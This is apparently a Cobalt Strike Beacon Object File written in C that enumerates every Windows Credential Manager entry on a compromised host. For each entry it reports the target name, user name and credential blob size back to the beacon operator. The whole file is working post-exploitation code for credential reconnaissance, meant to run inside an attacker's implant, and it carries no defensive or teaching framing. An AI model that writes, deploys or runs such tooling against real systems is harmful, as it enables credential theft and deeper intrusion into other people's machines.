#include <windows.h>
#include <wincred.h>
#include "beacon.h"
typedef BOOL (WINAPI *fn_CredEnumerateA)(LPCSTR, DWORD, DWORD *, PCREDENTIALA **);
typedef void (WINAPI *fn_CredFree)(PVOID);
void go(char *args, int alen) {
    (void)args; (void)alen;
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    if (hAdvapi32) {
        fn_CredEnumerateA pCredEnum = (fn_CredEnumerateA)GetProcAddress(hAdvapi32, "CredEnumerateA");
        fn_CredFree pCredFree = (fn_CredFree)GetProcAddress(hAdvapi32, "CredFree");
        if (pCredEnum && pCredFree) {
            PCREDENTIALA *creds = NULL; DWORD count = 0;
            if (pCredEnum("*", 0, &count, &creds)) {
                BeaconPrintf(CALLBACK_OUTPUT, "=== CredMan Entries (%u) ===\n", count);
                for (DWORD i = 0; i < count; i++) {
                    BeaconPrintf(CALLBACK_OUTPUT, "  [%u] Target: %s  User: %s  Blob: %lu bytes\n",
                        i, creds[i]->TargetName,
                        creds[i]->UserName ? creds[i]->UserName : "(none)",
                        (unsigned long)creds[i]->CredentialBlobSize);
                }
                pCredFree(creds);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] No saved creds\n");
            }
        }
        FreeLibrary(hAdvapi32);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] done\n");
}
